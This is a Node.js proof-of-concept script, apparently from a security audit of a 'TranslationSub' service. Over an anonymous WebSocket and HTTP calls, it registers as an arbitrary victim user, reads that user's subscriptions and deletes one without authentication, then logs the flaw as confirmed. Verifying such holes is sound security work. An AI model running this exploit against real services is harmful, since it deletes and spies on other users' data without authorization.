import assert from 'node:assert/strict';

const base = process.env.TRANSLATIONSUB_BASE_URL || 'http://127.0.0.1:9118';
const uid = 'security-victim@translationsub.test';
const profileId = '7';
const subscriptionId = 'security-victim-subscription';

function wsBase(url) {
  return url.replace(/^http:/i, 'ws:').replace(/^https:/i, 'wss:');
}

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function withTimeout(promise, ms, label) {
  let timer;
  return Promise.race([
    promise.finally(() => clearTimeout(timer)),
    new Promise((_, reject) => {
      timer = setTimeout(() => reject(new Error(`timeout: ${label}`)), ms);
    })
  ]);
}

async function jsonFetch(path, options = {}) {
  const response = await fetch(base + path, options);
  const text = await response.text();
  let body = null;
  try { body = text ? JSON.parse(text) : null; } catch { body = text; }
  return { status: response.status, ok: response.ok, body };
}

const id = `security-audit-${Math.random().toString(36).slice(2)}`;
const ws = new WebSocket(`${wsBase(base)}/nws?id=${encodeURIComponent(id)}&ver=1`);
const messages = [];
let connectedResolve;
const connected = new Promise(resolve => { connectedResolve = resolve; });
let changedResolve;
const changed = new Promise(resolve => { changedResolve = resolve; });

ws.onerror = event => {
  console.error('websocket error', event?.message || 'unknown');
};
ws.onmessage = event => {
  if (event.data === 'pong') return;
  let message;
  try { message = JSON.parse(event.data); } catch { return; }
  messages.push(message);
  if (message?.method === 'Connected') connectedResolve(message);
  if (message?.method === 'TranslationSubChanged') changedResolve(message);
};

try {
  await withTimeout(connected, 5000, 'anonymous NWS connect');
  console.log('anonymous NWS connection accepted');

  ws.send(JSON.stringify({
    method: 'TranslationSubRegister',
    args: [uid, profileId]
  }));
  await delay(250);

  const snapshot = await jsonFetch(
    `/translationsub/v2/snapshot?uid=${encodeURIComponent(uid)}&profile_id=${encodeURIComponent(profileId)}`
  );
  assert.equal(snapshot.status, 200, snapshot);
  const victim = (snapshot.body?.subscriptions || []).find(item => item?.id === subscriptionId);
  assert.ok(victim, snapshot.body);

  const remove = await jsonFetch(
    `/translationsub/v2/subscriptions/${encodeURIComponent(subscriptionId)}/remove`
      + `?uid=${encodeURIComponent(uid)}&profile_id=${encodeURIComponent(profileId)}`,
    { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{}' }
  );
  assert.equal(remove.status, 200, remove);
  assert.equal(remove.body?.success, true, remove.body);

  const event = await withTimeout(changed, 5000, 'spoofed victim invalidation');
  assert.equal(event?.method, 'TranslationSubChanged', event);
  assert.ok(Array.isArray(event?.args), event);
  assert.equal(event.args[1], 'subscription', event);

  console.log(`CONFIRMED HIGH: anonymous NWS client registered arbitrary uid=${uid}`);
  console.log('CONFIRMED HIGH: unauthenticated caller deleted victim subscription and received victim invalidation');
} finally {
  try { ws.close(); } catch {}
}
